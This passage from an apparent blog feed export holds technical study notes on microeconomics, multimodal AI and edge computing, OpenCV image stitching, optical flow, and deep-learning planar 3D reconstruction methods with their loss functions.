<h3 id="通过投资的经济增长"><a href="#通过投资的经济增长" class="headerlink" title="通过投资的经济增长"></a>通过投资的经济增长</h3><p>假设这个猎人不打算采摘浆果，而是专注于捕捉兔子。并且他准备制作一些<strong>兔子陷阱</strong>来自动捕捉兔子。这个猎人一天最多制作3个陷阱，或者抓5只兔子，我门画出兔子陷阱和兔子的<strong>生产可能性边界</strong>($PPF_0$)图: </p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_5_1.png-QNthin"></p>
<p>如果这个猎人第一天抓了<strong>4只兔子</strong>，做了<strong>一个陷阱</strong>，那么从第二天开始<strong>陷阱</strong>就可以帮助猎人多抓一只兔子($PPF_1$):</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_5_2.png-QNthin"></p>
<p>第二天猎人准备制作2个<strong>陷阱</strong>，接下来<strong>生产可能性边界</strong>就变为下图的$PPF_2$。</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_5_3.png-QNthin"></p>
<p>我们将捕捉兔子称为<strong>消费</strong>(consumption)，制作兔子陷阱称为<strong>投资</strong>(investment)。通过投资，可以增加他的总生效率；如果将他看作一个经济体，那么他正在经历<strong>经济增长</strong>(economic growth)</p>
<h3 id="比较优势专业化和贸易利得"><a href="#比较优势专业化和贸易利得" class="headerlink" title="比较优势专业化和贸易利得"></a>比较优势专业化和贸易利得</h3><p>假设Charlie可以生产30个杯子或10个盘子，Patty能生产10个杯子或30个盘子。</p>
<p>可以看出，Charlie的机会成本为<code>10个盘子＝30个杯子</code>，Patty的机会成本为<code>30个盘子＝10个杯子</code>。Patty相对于Charlie在盘子上比较占优势</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_6_1.png-QNthin"></p>
<p>如果双方专业化他们的优势，然后交易，那么他们得到的结果能够超越他们个人的<strong>生产可能性边界</strong>（虚线部分）</p>
<p><img src="http://qiniu.s1nh.org/Blog_microeconomics-note_6_2.png-QNthin"> </p>
<p><em>–未完待续–</em></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>经济学</tag>
      </tags>
  </entry>
  <entry>
    <title>多模态人工智能与边缘计算技术</title>
    <url>/post/multi-modal-and-edge-compute/</url>
    <content><![CDATA[<ul>
<li><code>自然交互</code>：更接近与人之间的交互方式。 <strong>PC</strong>：键盘鼠标；<strong>移动</strong>：触控；<strong>现在</strong>：语音、手势、图像。</li>
<li><code>云端一体</code>：</li>
<li><code>场景智能</code>：主动感知、用户理解、个性化推荐、智能决策。</li>
</ul>
<h2 id="0x01-多模态自然交互"><a href="#0x01-多模态自然交互" class="headerlink" title="0x01 多模态自然交互"></a>0x01 多模态自然交互</h2><blockquote>
<p>5G加速智联网时代的到来，多模态数据成为主流<br>电阻屏=&gt;电容屏：流量从PC时代走向移动时代<br>多模态自然交互：移动时代走向智联网时代</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200918205030958_203510884.png-QNthin"></p>
<ul>
<li><code>1976</code> 发现麦格克效应</li>
<li><code>2015</code> 200 citation–&gt;3000+ citation. 有代表的论文 VQA: Visual Question Answering (ICCV 2015)</li>
<li><code>2016</code> 多个大型多模态数据集发表 (Youtube8m, audioset)</li>
<li><code>2017</code> VoxCeleb 发布（多模态自然人识别数据集）</li>
<li><code>2018</code> 视觉语音降噪，虚拟人合成技术</li>
</ul>
<span id="more"></span>
<h3 id="1-1-语音语义一体化"><a href="#1-1-语音语义一体化" class="headerlink" title="1.1. 语音语义一体化"></a>1.1. 语音语义一体化</h3><p><strong>传统语音语意理解方法</strong> 语音和文本模态分离建模：语音到文本，文本到语义，形成两个模态的串联信道。<br><img src="http://qiniu.s1nh.org/multi_modal_20200918212935425_1706085101.png-QNthin"></p>
<p><strong>在语音模态上理解语义</strong> 利用文字领域知识理解语音需要一个更好的中间编码形式<br><img src="http://qiniu.s1nh.org/multi_modal_20200918213321395_970637763.png-QNthin"></p>
<p><strong>语音语义一体化：基于音素的跨模态实体链接</strong> 单个模型减少传统链路上串行模块的总信息损耗，减少传统ASR+NER中30%的实体识别错误。<br><img src="http://qiniu.s1nh.org/multi_modal_20200918213606932_1223100129.png-QNthin"></p>
<h3 id="1-2-多模态唤醒"><a href="#1-2-多模态唤醒" class="headerlink" title="1.2. 多模态唤醒"></a>1.2. 多模态唤醒</h3><p>不同的唤醒方式进行融合保证对话的流畅性</p>
<ul>
<li>语音：唤醒词（低功耗芯片）</li>
<li>视觉：视线+注意力+唇动</li>
<li>上下文理解：连贯的上下文（刚才的歌再放一遍）</li>
</ul>
<h3 id="1-3-多模态对话"><a href="#1-3-多模态对话" class="headerlink" title="1.3. 多模态对话"></a>1.3. 多模态对话</h3><p><strong>时装零售数据集</strong><br><img src="http://qiniu.s1nh.org/multi_modal_20200918235329496_52750634.png-QNthin"></p>
<blockquote>
<p>Nie, Liqiang , et al. “Multimodal Dialog System: Generating Responses via Adaptive Decoders.” the 27th ACM International Conference ACM, 2019.</p>
</blockquote>
<p>挑战一：需理解多模态顺序上下文，以捕获用户意图并生成相关正确响应；<br>挑战二：需考虑额外信息（如商品属性）以推荐最相关图片；<br>挑战三：需构建统一的模型以编码各种形式的领域知识。</p>
<p><strong>模型框架</strong><br><img src="http://qiniu.s1nh.org/multi_modal_20200918222814979_1387878526.png-QNthin"></p>
<p><strong>上下文理解</strong></p>
<ol>
<li>双层RNN</li>
<li>Low-level 做 embedding，输入high-level RNN.<br><img src="http://qiniu.s1nh.org/multi_modal_20200918225448352_1119779237.png-QNthin"></li>
</ol>
<p><strong>对话式图片推荐</strong></p>
<ol>
<li>Prodoct Encoder考虑局部对齐关系</li>
<li>计算 Context Vector (query) 与Product Embedding 的 similarity.</li>
<li>Max-Margin Loss.</li>
</ol>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200918225617889_1730437598.png-QNthin"></p>
<p><strong>多形式知识建模</strong> </p>
<ol>
<li><p>decoder: hiddin state(query) 从 kowledge base 中 retrieve<br><img src="http://qiniu.s1nh.org/multi_modal_20200918225754256_93678265.png-QNthin"></p>
</li>
<li><p>Embeed network，mapping function</p>
</li>
</ol>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200918231235665_345086604.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200918233814332_1289799814.png-QNthin"></p>
<h2 id="0x02-边缘计算"><a href="#0x02-边缘计算" class="headerlink" title="0x02 边缘计算"></a>0x02 边缘计算</h2><h3 id="2-1-什么是边缘计算"><a href="#2-1-什么是边缘计算" class="headerlink" title="2.1. 什么是边缘计算"></a>2.1. 什么是边缘计算</h3><p>在聊边缘计算之前，我们先聊聊这个星球上最魔性的生物之一——章鱼。</p>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200919000910575_1816643074.png-QNthin"><br><img src="http://qiniu.s1nh.org/multi_modal_20200919001103926_1545135319.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/multi_modal_edge.webp-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/multi_modal_20200919001137491_1717046909.png-QNthin"></p>
<ol>
<li>边缘计算可以实时或更快的进行数据处理和分析，让数据处理更靠近源，而不是外部数据中心或者云，可以缩短延迟时间。</li>
<li>在成本预算上可以大大减轻经费预算。企业在本地设备上的数据管理解决方案所花费的成本大大低于云和数据中心网络。</li>
<li>减少网络流量。随着物联网设备数量的增加，数据生成继续以创纪录的速度增长。结果，网络带宽变得更加有限，压倒了云，导致更大的数据瓶颈。</li>
<li>提高应用程序效率。通过降低延迟级别，应用程序可以更高效、更快速地运行。</li>
<li>个性化：通过边缘计算，可以持续学习，根据个人的需求调整模型，带来个性化互动体验。</li>
<li>隐私性：网络边缘数据涉及个人隐私，传统的云计算模式需要将这些隐私数据上传至云计算中心，这将增加泄露用户隐私数据的风险。在边缘计算中，身份认证协议的研究应借鉴现有方案的优势之处，同时结合边缘计算中分布式、移动性等特点，加强统一认证、跨域认证和切换认证技术的研究，以保障用户在不同信任域和异构网络环境下的数据和隐私安全。</li>
</ol>
<h3 id="2-2-物联网里面的边缘计算"><a href="#2-2-物联网里面的边缘计算" class="headerlink" title="2.2. 物联网里面的边缘计算"></a>2.2. 物联网里面的边缘计算</h3><p>目前国内高技术领域的投入主要集中在围绕5G和AI两大块的落地上，而物联网则是目前网络技术打造的重点，也是各个行业实现效率提升、数字化转型的重要手段。投入这么多钱搞5G网络，从产业的思路是希望催生新的产业生态和商业模式。这里需要各个细分的行业，借助于自己的经验，根据场景的分类通过边缘计算可以提升物联网的智能化，找到物联网在各个垂直行业落地生根的钥匙。</p>
<h3 id="2-3-边缘计算的AI芯片"><a href="#2-3-边缘计算的AI芯片" class="headerlink" title="2.3. 边缘计算的AI芯片"></a>2.3. 边缘计算的AI芯片</h3><p>作为边缘计算的核心基础，边缘AI芯片有着重要地位，边缘AI芯片厂商作为产业链上游参与方投入大量资源进行技术研发，从供给方面为边缘智能的实现打下坚实牢固基础。边缘计算芯片主要分为一下三类：</p>
<ol>
<li>嵌入式GPU：NVIDIA jetson.</li>
<li>通用深度学习加速器（NPU）：Intel Movidius、RK3399Pro、Qualcomm®Kryo™300、海思、麒麟 980、google Coral、地平线、寒武纪、比特大陆.</li>
<li>专用芯片：语音唤醒芯片、命令词识别芯片、降噪芯片.</li>
</ol>
<p>开发难度，通用型，功耗</p>
<h3 id="2-4-边缘计算的-AI-框架（推理框架）"><a href="#2-4-边缘计算的-AI-框架（推理框架）" class="headerlink" title="2.4. 边缘计算的 AI 框架（推理框架）"></a>2.4. 边缘计算的 AI 框架（推理框架）</h3><ul>
<li>Tensorflow Lite</li>
<li>PaddlePaddle</li>
<li>Core ML（Apple）</li>
<li>Tensor RT （Nvidia）</li>
</ul>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>边缘计算</tag>
        <tag>多模态</tag>
      </tags>
  </entry>
  <entry>
    <title>2016-06-12 OpenCV学习笔记</title>
    <url>/post/note-2016-06-12/</url>
    <content><![CDATA[<p>本周基于OpenCV进行了一次完整的图像拼接测试，和移动物体探测实验</p>
<h2 id="图像拼接测试"><a href="#图像拼接测试" class="headerlink" title="图像拼接测试"></a>图像拼接测试</h2><p>测试采用<code>Python2.7</code>, <code>OpenCV3</code>, 对26张<code>12Mp(4000×3000)</code>进行SIFT角点检测，每张图片缩放为之前的0.12倍，利用CPU（8线程i7-6700HQ）进行完整拼接的时间为30秒。（代码链接：<a href="https://github.com/duchengyao/mosaic">https://github.com/duchengyao/mosaic</a> ）</p>
<p><img src="http://qiniu.s1nh.org/Blog_mosaic-CPU-1.gif" title="拼接过程（点击可查看大图）"></p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_mosaic-sources.png-QNthin" title="拼接资源"></p>
<p><img src="http://qiniu.s1nh.org/Blog_mosaic-final_output.png-QNthin" title="拼接结果"></p>
<h2 id="移动物体探测"><a href="#移动物体探测" class="headerlink" title="移动物体探测"></a>移动物体探测</h2><p>实验算法的思路为，取视频的前一帧和当前帧进行对比，如果发生了显著变化，那么就可以认为图像中有移动物体。（程序在<code>OpenCV 2.4.11-nppy27_0</code>运行通过，代码链接：<a href="https://github.com/duchengyao/pycv/blob/master/motion-detector.py">https://github.com/duchengyao/pycv/blob/master/motion-detector.py</a> ）</p>
<p><img src="http://qiniu.s1nh.org/Blog_motion-detector.gif" title="移动物体探测"></p>
<blockquote>
<p>参考：<br>[1] KaewTraKulPong 等人发表的《<a href="http://www.ee.surrey.ac.uk/CVSSP/Publications/papers/KaewTraKulPong-AVBS01.pdf">An improved adaptive background mixture model for real-time tracking with shadow detection</a>》。这个方法可以通过cv2.BackgroundSubtractorMOG来使用。<br>[2] Zivkovic 提出的《<a href="http://www.zoranz.net/Publications/zivkovic2004ICPR.pdf">Improved adaptive Gaussian mixture model for background subtraction</a>》和《<a href="http://www.zoranz.net/Publications/zivkovicPRL2006.pdf">Efficient Adaptive Density Estimation per Image Pixel for the Task of Background Subtraction</a>》。可以通过 cv2.BackgroundSubtractorMOG2 来使用。</p>
</blockquote>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>图像拼接</tag>
        <tag>移动物体探测</tag>
        <tag>OpenCV</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>光流(Optical Flow)介绍</title>
    <url>/post/optical-flow-intro/</url>
    <content><![CDATA[<blockquote>
<p>绝大部分摘自<a href="http://blog.csdn.net/zouxy09/article/details/8683859">光流Optical Flow介绍与OpenCV实现</a>，<a href="http://ice1020502.blog.163.com/blog/static/50118553200832583036790/">光流法介绍</a></p>
</blockquote>
<p>光流是空间运动物体在观察成像平面上的像素运动的瞬时速度，是利用图像序列中像素在时间域上的变化以及相邻帧之间的相关性来找到上一帧跟当前帧之间存在的对应关系，从而计算出相邻帧之间物体的运动信息的一种方法。</p>
<span id="more"></span>

<p>1981年，Horn和Schunck创造性地将二维速度场与灰度相联系，引入光流约束方程，得到光流计算的基本算法。人们基于不同的理论基础提出各种光流计算方法，算法性能各有不同。Barron等人对多种光流计算技术进行了总结，按照理论基础与数学方法的区别把它们分成四种：基于梯度的方法、基于匹配的方法、基于能量的方法、基于相位的方法。近年来神经动力学方法也颇受学者重视。</p>
<p>在比较理想的情况下，它能够检测独立运动的对象，不需要预先知道场景的任何信息，可以很精确地计算出运动物体的速度，并且可用于摄像机运动的情况。</p>
<p>但光流法存在下面的缺点：有时即使没有发生运动，在外部照明发生变化时，也可以观测到光流；另外，在缺乏足够的灰度等级变化的区域，实际运动也往往观测不到。三维物体的运动投影到二维图像的亮度变化，本身由于部分信息的丢失而使光流法存在孔径问题和遮挡问题，用光流法估算二维运动场是不确定的，需要附加的假设模型来模拟二维运动场的结构；在准确分割时，光流法还需要利用颜色、灰度、边缘等空域特征来提高分割精度；同时由于光流法采用迭代的方法，计算复杂耗时，如果没有特殊的硬件支持，很难应用于视频序列的实时检测。</p>
<h3 id="光流方程"><a href="#光流方程" class="headerlink" title="光流方程"></a>光流方程</h3><p>假设$E(x,y,t)$为$(x,y)$点在时刻t的灰度（照度）。设$t+dt$时刻该点运动到$(x+dx,y+dy)$点，他的照度为$E(x+dx,y+dy,t+dt)$。我们认为，由于对应同一个点，所以<br>$$E(x,y,t) = E(x+dx,y+dy,t+dt) ,,,,,,,（光流约束方程）$$<br>将上式右边做泰勒展开，并令$dt-&gt;0$，则得到 $Exu+Eyv+Et = 0$，其中：<br>$$Ex =  \dfrac{dE}{dx} ,,,, Ey =  \dfrac{dE}{dy} ,,,, Et = \dfrac{dE}{dt} ,,,, u = \dfrac{dx}{dt} ,,,, v = \dfrac{dy}{dt} $$<br>上面的Ex,Ey,Et的计算都很简单，用离散的差分代替导数就可以了。光流法的主要任务就是通过求解光流约束方程求出u,v。如果用于摄像机固定的这一特定情况，问题可以大大简化。</p>
<h3 id="摄像机固定的情形"><a href="#摄像机固定的情形" class="headerlink" title="摄像机固定的情形"></a>摄像机固定的情形</h3><p>在摄像机固定的情形下，运动物体的检测其实就是分离前景和背景的问题。对于背景，理想情况下，其光流应当为0，只有前景才有光流。所以并不要求通过求解光流约束方程求出u,v。只要求出亮度梯度方向的速率$sqrt(u*u+v*v)$即可。<br>由光流约束方程得到到梯度方向的光流速率为 $V = abs(\dfrac{Et}{sqrt(Ex*Ex+Ey*Ey)})$。<br>设定一个阈值T，若$V(x,y) &gt; T$ 则$(x,y)$是前景 ，反之是背景。</p>
<h3 id="Munsell颜色系统"><a href="#Munsell颜色系统" class="headerlink" title="Munsell颜色系统"></a>Munsell颜色系统</h3><p>光流场是图片中每个像素都有一个x方向和y方向的位移，所以在上面那些光流计算结束后得到的光流flow是个和原来图像大小相等的双通道图像。可以用Munsell颜色系统来显示。</p>
<p><img src="http://qiniu.s1nh.org/Blog_optical_flow-01.jpg-QNthin"></p>
<p>孟塞尔颜色系统的空间大致成一个圆柱形：</p>
<blockquote>
<p>南北轴=明度（value），从全黑（1）到全白（10）。<br>经度=色相（hue）。把一周均分成五种主色调和五种中间色：红(R)、红黄(YR)、黄(Y)、黄绿(GY)、绿(G)、绿蓝(BG)、蓝(B)、蓝紫(PB)、紫(P)、紫红(RP)。相邻的两个位置之间再均分10份，共100份。<br>距轴的距离=色度（chroma），表示色调的纯度。其数值从中间（0）向外随着色调的纯度增加，没有理论上的上限（普通的颜色实际上限为10左右，反光、荧光等材料可高达30）。由于人眼对各种颜色的的敏感度不同，色度不一定与每个色调和明度组合相匹配。</p>
</blockquote>
<p>具体颜色的标识形式为：色相+明度+色度。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>[1]Pyramidal Implementation of the Lucas Kanade Feature TrackerDescription of the algorithm<br>通过金字塔Lucas-Kanade 光流方法计算某些点集的光流（稀疏光流）。</p>
<p>[2]Two-Frame Motion Estimation Based on PolynomialExpansion”<br>用Gunnar Farneback 的算法计算稠密光流（即图像上所有像素点的光流都计算出来）。</p>
<p>[3]通过块匹配的方法来计算光流。</p>
<p>[4]Determining Optical Flow<br>用Horn-Schunck 的算法计算稠密光流。</p>
<p><a href="http://graphics.berkeley.edu/papers/Tao-SAN-2012-05/">SimpleFlow: A Non-iterative, Sublinear Optical FlowAlgorithm</a><br>这一个是2012年欧洲视觉会议的一篇文章的实现</p>
<p>IJCV2011有一篇文章，《<a href="http://vision.middlebury.edu/flow/">A Database and Evaluation Methodology for Optical Flow</a>》里面对主流的光流算法做了简要的介绍和对不同算法进行了评估。</p>
]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
  </entry>
  <entry>
    <title>Planar Reconstruction - 深度学习之平面重建</title>
    <url>/post/planar-reconstruction/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th style="text-align:center"><img src="http://qiniu.s1nh.org/PlaneNet-head-1.png" alt=""></th>
<th style="text-align:center"><img src="http://qiniu.s1nh.org/PlaneNet-head-2.png" alt=""></th>
<th style="text-align:center"><img src="http://qiniu.s1nh.org/PlaneNet-head-3.png" alt=""></th>
<th style="text-align:center"><img src="http://qiniu.s1nh.org/PlaneNet-head-4.png" alt=""></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">input image</td>
<td style="text-align:center">piece-wise planar segmentation</td>
<td style="text-align:center">reconstructed depthmap</td>
<td style="text-align:center">texture-mapped 3D model</td>
</tr>
</tbody>
</table>

<span id="more"></span>

<h2 id="0x00-Datasets"><a href="#0x00-Datasets" class="headerlink" title="0x00 Datasets"></a>0x00 Datasets</h2><ul>
<li>ScanNet [1,3,4]</li>
<li>SYNTHIA [2,3]</li>
<li>Cityscapes [2]</li>
<li>NYU Depth Dataset [1,3,4]</li>
<li>Labeling method</li>
</ul>
<p><strong>ScanNet:</strong> Richly-annotated 3D Reconstructions of Indoor Scenes. <em>annotated with 3D camera poses, surface reconstructions, and instance-level semantic segmentations.</em></p>
<p><img src="http://qiniu.s1nh.org/ScanNet.png" alt=""></p>
<p><strong>SYNTHIA:</strong> The SYNTHetic collection of Imagery and Annotations. <em>8 RGB cameras forming a binocular 360º camera, 8 depth sensors</em><br><img src="http://qiniu.s1nh.org/SYNTHIA.png" alt=""></p>
<p><strong>Cityscapes:</strong> Benchmark suite and evaluation server for pixel-level and instance-level semantic labeling.<br><em>video frames / stereo / GPS / vehicle odometry</em></p>
<p><img src="http://qiniu.s1nh.org/Cityscapes.png" alt=""></p>
<p><strong>NYU Depth Dataset:</strong> is recorded by both the <strong>RGB</strong> and <strong>Depth</strong> cameras from the Microsoft Kinect.</p>
<ul>
<li>Dense multi-class labels with <strong>instance</strong> number (cup1, cup2, cup3, etc). </li>
<li>Raw: The raw <strong>rgb</strong>, <strong>depth</strong> and <strong>accelerometer</strong> data as provided by the Kinect.</li>
<li><strong>Toolbox</strong>: Useful functions for manipulating the data and labels.</li>
</ul>
<p><img src="http://qiniu.s1nh.org/NYU-dataset.jpg" alt=""></p>
<h3 id="Obtaining-ground-truth-plane-annotations"><a href="#Obtaining-ground-truth-plane-annotations" class="headerlink" title="Obtaining ground truth plane annotations :"></a>Obtaining ground truth plane annotations :</h3><p>Difficulty in detect planes from the 3D point cloud by using <strong>J-Linkage</strong> method.</p>
<table>
<thead>
<tr>
<th style="text-align:center"><img src="http://qiniu.s1nh.org/PlaneRecover-fig2.png" alt=""></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>(c-d):</strong> Plane fitting results generated by J-Linkage with δ = 0.5 and δ = 2, respectively.</td>
</tr>
</tbody>
</table>
<h3 id="Labeling-method"><a href="#Labeling-method" class="headerlink" title="Labeling method:"></a>Labeling method:</h3><table>
<thead>
<tr>
<th style="text-align:left"><strong>ScanNet:</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1. Fit plans to a consolidated mesh (merge planes if (normal diff &lt; 20° &amp;&amp; distance &lt; 5cm)</td>
</tr>
<tr>
<td style="text-align:left">2. Project plans back to individual frames</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>SYNTHIA:</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1. Manually <strong>draw a quadrilateral region</strong></td>
</tr>
<tr>
<td style="text-align:left">2. Obtain the <strong>plane parameters</strong> and <strong>variance</strong> of the distance distribution</td>
</tr>
<tr>
<td style="text-align:left">3. <strong>Find all pixels</strong> that belong to the plane by using the plane parameters and the variance estimate</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>Cityscapes:</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">1. “planar” = {ground, road, sidewalk,parking, rail track, building, wall, fence, guard rail, bridge, and terrain}</td>
</tr>
<tr>
<td style="text-align:left">2. Manually label the boundary of each plane using polygons</td>
</tr>
</tbody>
</table>
<h2 id="0x01-PlaneNet"><a href="#0x01-PlaneNet" class="headerlink" title="0x01 PlaneNet"></a>0x01 PlaneNet</h2><p><strong>[<a href="https://github.com/art-programmer/PlaneNet" target="_blank" rel="noopener">CVPR 2018</a>]</strong> Liu, Chen, et al. <strong>Washington University in St. Louis, Adobe.</strong> </p>
<p><em>The first deep neural architecture for piece-wise planar depthmap reconstruction from a RGB image.</em></p>
<h3 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p><img src="http://qiniu.s1nh.org/PlaneNet-pipeline.png" alt=""></p>
<p><strong>DRN:</strong> Dilated Residual Networks (2096 channels)</p>
<p><strong>CRF:</strong> Conditional Random Field Algorithm</p>
<table>
<thead>
<tr>
<th style="text-align:left">Step</th>
<th style="text-align:left">Loss</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>Plane parameter:</strong></td>
<td style="text-align:left">$$L^P=\sum_{i=1}^{K^*}min_{j\in[1,K]}\Vert P_i^*-P_j \Vert_2^2 \;\;\; (K = 10)$$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Plane segmentation:</strong> softmax cross entropy</td>
<td style="text-align:left">$$L^M=\sum_{i=1}^{K+1}\sum_{p \in I}(1(M^{*(p)}=i)log(1-M_i^{(p)}))$$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Non-planar depth:</strong> ground-truth &lt;==&gt; predicted depthmap</td>
<td style="text-align:left">$$L^D=\sum_{i=1}^{K+1}\sum_{p\in I}(M_i^{(p)}(D_i^{(p)}-D^{*(p)})^2)$$</td>
</tr>
<tr>
<td style="text-align:left">-</td>
<td style="text-align:left">$M^{(p)}\text{: probability of p belonging to the } i^{th} \text{ plane ;}\\ D^{(p)} \text{: depth value at pixel }p \text{ ;}\\ \text{*: GT .}$</td>
</tr>
</tbody>
</table>
<h2 id="0x02-Plane-Recover"><a href="#0x02-Plane-Recover" class="headerlink" title="0x02 Plane Recover"></a>0x02 Plane Recover</h2><p><strong>[<a href="https://github.com/fuy34/planerecover" target="_blank" rel="noopener">ECCV 18</a>]</strong> Fengting Yang and Zihan Zhou <strong>Pennsylvania State University.</strong> </p>
<p><em>Recovering 3D Planes from a Single Image. Propose a novel plane structure-induced loss</em></p>
<p><img src="http://qiniu.s1nh.org/PlaneRecover-fig3.png" alt=""></p>
<table>
<thead>
<tr>
<th style="text-align:left">Step</th>
<th style="text-align:left">Loss</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>Plane loss</strong></td>
<td style="text-align:left">$$L_{reg}(S_{i})=\sum_{q}^{}-z(q)\cdot log(p_{plane}(q))-(1-z(q))\cdot log(1-p_{plane}(q))$$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Loss</strong></td>
<td style="text-align:left">$$L=\sum_{i=1}^{n}\sum_{j=1}^m\left(\sum_{q}S_{i}^{j}(q)\cdot \vert(n_{i}^{j})^{T}Q-1\vert\right)+\alpha \sum_{i=1}^{n}L_{reg}(S_{i})$$</td>
</tr>
</tbody>
</table>
<h2 id="0x03-PlaneRCNN"><a href="#0x03-PlaneRCNN" class="headerlink" title="0x03 PlaneRCNN"></a>0x03 PlaneRCNN</h2><p>[CVPR2019] Liu, Chen, et al. <strong>NVIDIA, Washington University in St. Louis, SenseTime, Simon Fraser University</strong></p>
<p><img src="http://qiniu.s1nh.org/PlaneRCNN-fig2.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlaneRCNN-fig3.png" alt=""></p>
<h2 id="0x04-PlanarReconstruction"><a href="#0x04-PlanarReconstruction" class="headerlink" title="0x04 PlanarReconstruction"></a>0x04 PlanarReconstruction</h2><p>[<a href="https://github.com/svip-lab/PlanarReconstruction" target="_blank" rel="noopener">CVPR 2019</a>] Yu, Zehao, et al. <strong>ShanghaiTech University, The Pennsylvania State University</strong></p>
<p><em>Single-Image Piece-wise Planar 3D Reconstruction via Associative Embedding</em></p>
<p><img src="http://qiniu.s1nh.org/PlanarReconstruction-pipeline.png" alt=""></p>
<table>
<thead>
<tr>
<th style="text-align:left">Step</th>
<th style="text-align:left">Loss</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>Segmentation:</strong> balanced cross entropy</td>
<td style="text-align:left">$$L_{S}=-(1-w)\sum_{i\in\mathcal{F}}^{}\log p_{i}-w\sum_{i\in\mathcal{B}}^{}\log(1-p_{i})$$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Embedding:</strong> discuiminative loss</td>
<td style="text-align:left">$$L_{E}=L_{pull}+L_{push}$$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Per-pixel plane:</strong> L1 loss</td>
<td style="text-align:left">$$ L_{PP}=\frac{1}{N}\sum_{i=1}^{N}\vert n_{i}-n^{*}_{i}\ \vert $$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Instance Parameter:</strong></td>
<td style="text-align:left">$$L_{IP}=\frac{1}{N\tilde{C}}\sum_{j=1}^{\tilde{C}}\sum_{i=1}^{N}S_{ij}\cdot\vert n_{j}^{T}Q_{i}-1\vert $$</td>
</tr>
<tr>
<td style="text-align:left"><strong>Loss</strong></td>
<td style="text-align:left">$$L=L_{S}+L_{E}+L_{PP}+L_{IP}+…$$</td>
</tr>
</tbody>
</table>
<p><strong>Embedding:</strong><br>associative emvedding <em>(End-to-End Learning for Joint Detection and Grouping)</em> ;</p>
<p><img src="http://qiniu.s1nh.org/PlanarReconstruction-fig3.png" alt=""></p>
<!--https://www.jianshu.com/p/40324b53a528-->
<h3 id="Discriminative-loss-function"><a href="#Discriminative-loss-function" class="headerlink" title="Discriminative loss function"></a>Discriminative loss function</h3><ul>
<li><strong>An image can contain an arbitrary number of instances</strong> </li>
<li><strong>The labeling is permutation-invariant</strong>: it does not matter which specific label an instance gets, as long as it is different from all otherinstance labels.</li>
</ul>
<p><img src="http://qiniu.s1nh.org/DiscuiminativeLoss.png" alt=""></p>
<p>$$L_{E}=L_{pull}+L_{push}$$</p>
<p>$$where$$</p>
<p>$$L_{pull}=\frac{1}{C}\sum_{c=1}^{C}\frac{1}{N_{c}}\sum_{i=1}^{N_{c}}\max\left(\lVert\mu_{c}-x_{i}\rVert-\delta_{\textrm{v}},0\right)$$ </p>
<p>$$<br>L_{push}=\frac{1}{C(C-1)}\mathop{\sum_{c_{A}=1}^{C}\sum_{c_{B}=1}^{C}}_{c_{A}\neq c_{B}}\max\left(\delta_{\textrm{d}}-\lVert\mu_{c_{A}}-\mu_{c_{B}}\rVert,0\right)<br>$$</p>
<p><em>Here, $C$ is the number of clusters $C$ (planes) in the ground truth, $N_c$ is the number of elements in cluster $c$, $x_i$ is the pixel embedding, $μ_c$ is the mean embedding of the cluster $c$, and $δ_v$ and $δ_d$ are the margin for “pull” and “push” losses, respectively.</em></p>
<p><strong>Instance Parameter Loss:</strong></p>
<table>
<thead>
<tr>
<th>$$L_{IP}=\frac{1}{N\tilde{C}}\sum_{j=1}^{\tilde{C}}\sum_{i=1}^{N}S_{ij}\cdot\vert n_{j}^{T}Q_{i}-1\vert$$</th>
<th>$S\text{: instance segmentation map}\\n_{j}\text{: predicted plane param}\\Q_i\text{: the 3D point at pixel } i $</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p><em><center>$n\doteq\tilde{n}/d$ , where $\tilde{n}\in\mathcal{S}^{2}$ and $d$ denote the surface normal and plane distance to the origin</center></em></p>
<h2 id="0xFF-Results"><a href="#0xFF-Results" class="headerlink" title="0xFF Results"></a>0xFF Results</h2><h3 id="PlaneNet"><a href="#PlaneNet" class="headerlink" title="PlaneNet"></a>PlaneNet</h3><p><img src="http://qiniu.s1nh.org/PlaneNet-fig4.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlaneNet-tab1.png" alt=""></p>
